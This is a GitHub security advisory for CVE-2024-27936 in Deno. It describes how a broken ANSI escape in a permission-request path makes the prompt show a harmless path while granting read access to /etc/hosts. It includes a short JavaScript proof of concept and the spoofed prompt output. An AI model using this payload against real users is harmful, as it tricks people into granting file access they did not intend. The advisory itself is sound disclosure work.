# [H] Deno's deno_runtime vulnerable to interactive permission prompt spoofing via improper ANSI stripping

## Summary
Severity: High
Advisory: GHSA-m4pq-fv2w-6hrw
CVE: CVE-2024-27936
CWE: CWE-150
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2024-03-05
Source: https://github.com/advisories/GHSA-m4pq-fv2w-6hrw
Type: github-advisory

## Affected
- crates.io: `deno` — affected >=1.32.1 <1.41.0
- crates.io: `deno_runtime` — affected >=0.103.0 <0.147.0

## Details
### Summary
A maliciously crafted permission request can show the spoofed permission prompt by inserting a broken ANSI escape sequence into the request contents.

### Details
In [the patch for CVE-2023-28446](https://github.com/denoland/deno/commit/78d430103a8f6931154ddbbe19d36f3b8630286d), Deno is stripping any ANSI escape sequences from the permission prompt, but permissions given to the program are based on the contents that contain the ANSI escape sequences.

For example, requesting the read permission with `/tmp/hello\u001b[/../../etc/hosts` as a path will display the `/tmp/hellotc/hosts` in the permission prompt, but the actual permission given to the program is `/tmp/hello\u001b[/../../etc/hosts`, which is `/etc/hosts` after the normalization.

This difference allows a malicious Deno program to spoof the contents of the permission prompt.


### PoC
Run the following JavaScript and observe that `/tmp/hellotc/hosts` is displayed in the permission prompt instead of `/etc/hosts`, although Deno gives access to `/etc/hosts`.
``` javascript
const permission = { name: "read", path: "/tmp/hello\u001b[/../../etc/hosts" };
await Deno.permissions.request(permission);
console.log(await Deno.readTextFile("/etc/hosts"));
```

#### Expected prompt
```
┌ ⚠️  Deno requests read access to "/etc/hosts".
├ Requested by `Deno.permissions.query()` API
├ Run again with --allow-read to bypass this prompt.
└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all read permissions) >
```

#### Actual prompt
```
┌ ⚠️  Deno requests read access to "/tmp/hellotc/hosts".
├ Requested by `Deno.permissions.query()` API
├ Run again with --allow-read to bypass this prompt.
└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all read permissions) >

```

### Impact
Any Deno program can spoof the content of the interactive permission prompt by inserting a broken ANSI code, which allows a malicious Deno program to display the wrong file path or program name to the user.

## References
- https://github.com/denoland/deno/security/advisories/GHSA-m4pq-fv2w-6hrw
- https://nvd.nist.gov/vuln/detail/CVE-2024-27936
- https://github.com/denoland/deno/commit/78d430103a8f6931154ddbbe19d36f3b8630286d
- https://github.com/denoland/deno/commit/7e6b94231290020b55f1d08fb03ea8132781abc5
- https://github.com/denoland/deno
